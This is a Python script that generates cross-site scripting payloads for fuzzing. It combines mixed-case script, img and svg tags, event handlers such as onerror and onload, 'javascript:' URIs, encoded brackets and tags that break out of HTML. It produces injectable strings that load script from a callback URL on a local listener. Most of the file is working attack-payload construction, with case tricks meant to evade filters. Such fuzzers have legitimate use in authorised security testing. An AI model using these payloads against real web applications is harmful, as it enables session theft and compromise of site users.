import random
import os

URL = "http://127.0.0.1:4040/"

CALLBACK_URLs = [
    f'"{URL}"',
    f"'{URL}'",
    f"`{URL}`"
]

CALLBACKs = [
    f'import("{URL}")',
    f"import('{URL}')",
    f"import(`{URL}`)"
]

xssTokens = {
    "inline" : [
        "jAvAsCriPt:"
    ],
    "trigger_exploits": [
        CALLBACKs[0],
        CALLBACKs[1],
        CALLBACKs[2]
    ],
    "exploits": [
        f"<ScRiPt sRc={CALLBACK_URLs[0]}></ScRiPt>",
        f"<ScRiPt sRc={CALLBACK_URLs[1]}></ScRiPt>",
        f"<ScRiPt sRc={CALLBACK_URLs[2]}></ScRiPt>",
    ],
    "literal_tokens": [
        " ",
        ';',
        ',',
        '\'',
        '/',
        '<!--',
        '-->',
        '--!>',
        '(',
        ')',
        '/*',
        "-",
        "`",
        "'",
        '"',
        "*",
        '*/',
        '\x20', # | |
        '\x27',  # |'|
     ],
    "open": [
        '<',
        '&lt;',
        '\x3c',
    ],
    "pre_token": [
        '/',
    ],
    "html_tokens": [
        'sCrIpT',
        'iMg',
        'sVg',
    ],
    "trigger_tokens": [
        ' oNLoAd=',
        ' oNeRrOr=',
        ' onClICk=',
        ' oNFoCus=',
        ' OnBlUr=',
        ' oNtOgGle=',
        ' oNmOuSeLeaVe=',
        ' oNmOuSeOveR=',
    ],
    "html_break_only_tokens": [
        'a',
        'bUtTon',
        'iNpUt',
        'frAmEsEt',
        'teMplAte',
        'auDio',
        'viDeO',
        'sOurCe',
        'hTmL',
        'nOeMbed',
        'noScRIpt',
        'StYle',
        'ifRaMe',
        'xMp',
        'texTarEa',
        'nOfRaMeS',
        'tITle',
    ],
    "pre_close": [
        '/',
    ],
    "close": [
        '&gt;',
        '>',
        '\x3e'
    ]
}

TOKEN_CATEGORIES = list(xssTokens.keys())

grammar = {
    "inline": ["inline", "trigger_exploits", "literal_tokens"],
    "open": ["html_tokens", "pre_token"],
    "pre_token": ["html_tokens", "html_break_only_tokens"],
    "html_tokens": ["literal_tokens", "trigger_tokens"],
    "html_break_only_tokens": ["close"],
    "pre_close": ["close"],
    "close": TOKEN_CATEGORIES,

    "exploits": TOKEN_CATEGORIES,
    "html_breaker": TOKEN_CATEGORIES,
    "literal_tokens": TOKEN_CATEGORIES,
    "pre_trigger_token": ["trigger_tokens"],
    "trigger_tokens": ["trigger_exploits", "literal_tokens"],
    "trigger_exploits": ["trigger_tokens", "pre_close", "close", "literal_tokens"]
}

class Payload:
    tokens = []
    token_categories = []

    def __init__(self, token=None, token_category=None):
        if token_category is None:
            token_category = random.choice(TOKEN_CATEGORIES)
        if token is None:
            token = random.choice(xssTokens[token_category])
        self.tokens = [token]
        self.token_categories = [token_category]

    def __len__(self):
        return len(self.tokens)

    def random_expand(self):
        self.token_categories.append(random.choice(TOKEN_CATEGORIES))
        self.tokens.append(random.choice(xssTokens[self.token_categories[-1]]))

    def grammar_expand(self):
        self.token_categories.append(random.choice(grammar[self.token_categories[-1]]))
        self.tokens.append(random.choice(xssTokens[self.token_categories[-1]]))

    def __str__(self):
        string = ""
        for token in self.tokens:
            string += token
        return string

def generate_payload(use_grammar:bool = True, length: int = None):
    if length is None:
        length = random.randint(1, 20)
    payload = Payload()
    for _ in range(1, length):
        if use_grammar:
            payload.grammar_expand()
        else:
            payload.random_expand()
    return payload


if __name__ == "__main__":
    for i in range(10):
        p = generate_payload()
        print(str(p))